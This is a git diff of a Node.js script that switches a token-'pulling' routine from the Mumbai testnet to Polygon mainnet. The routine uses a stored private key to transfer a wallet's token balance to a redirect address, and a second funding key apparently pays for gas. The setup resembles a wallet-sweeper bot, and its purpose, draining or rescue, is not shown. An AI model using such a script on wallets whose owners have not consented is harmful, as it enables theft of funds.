@@ -15,17 +15,17 @@ const multichainWallet = require('multichain-crypto-wallet')
 const { maticBalance, tokenBalance } = require('./balances')
 //this is the configuration for alchemy alchemy API and network
 const config = {
-  apiKey: process.env.TEST_APIKEY,
-  network: Network.MATIC_MUMBAI,
+  apiKey: process.env.APIKEY,
+  network: Network.MATIC_MAINNET,
 }
-const provider = new ethers.providers.JsonRpcProvider(process.env.TEST_RPC, {
+const provider = new ethers.providers.JsonRpcProvider(process.env.RPC, {
   chainId: parseInt(process.env.CHAIN_ID),
 })
 
 //Get Alchemy object
 const alchemy = new Alchemy(config)
 
-let signer = new Wallet(process.env.TEST_PRIVATE_KEY)
+let signer = new Wallet(process.env.PRIVATE_KEY)
 
 let fundSigner = new Wallet(process.env.FUND_PRIVATE_KEY)
 
@@ -37,14 +37,14 @@ const pullToken = async (bal) => {
   
   try {
     const transfer = await multichainWallet.transfer({
-      recipientAddress: process.env.TEST_REDIRECT,
+      recipientAddress: process.env.REDIRECT,
       amount: bal,
       network: 'ethereum',
-      rpcUrl: process.env.TEST_RPC,
-      privateKey: process.env.TEST_PRIVATE_KEY,
+      rpcUrl: process.env.RPC,
+      privateKey: process.env.PRIVATE_KEY,
       gasPrice: '50', // Gas price is in Gwei. leave empty to use default gas price
-      // tokenAddress: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
-      tokenAddress: '0x55A66D6D895443A63e4007C27a3464f827a1a5Cb',
+       tokenAddress: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
+      //tokenAddress: '0x55A66D6D895443A63e4007C27a3464f827a1a5Cb',
     }) // NOTE - For other EVM compatible blockchains all you have to do is change the rpcUrl.
 
     const wallets = Promise.resolve(transfer)
@@ -52,7 +52,7 @@ const pullToken = async (bal) => {
       if (value['hash'] === null) console.log('i am so sorry boss')
 
       console.log(
-        `pulled successfully to ${process.env.TEST_REDIRECT} with transaction hash: ${value['hash']}`,
+        `pulled successfully to ${process.env.REDIRECT} with transaction hash: ${value['hash']}`,
       )
 
       provider.once(value['hash'], async (transaction) => {
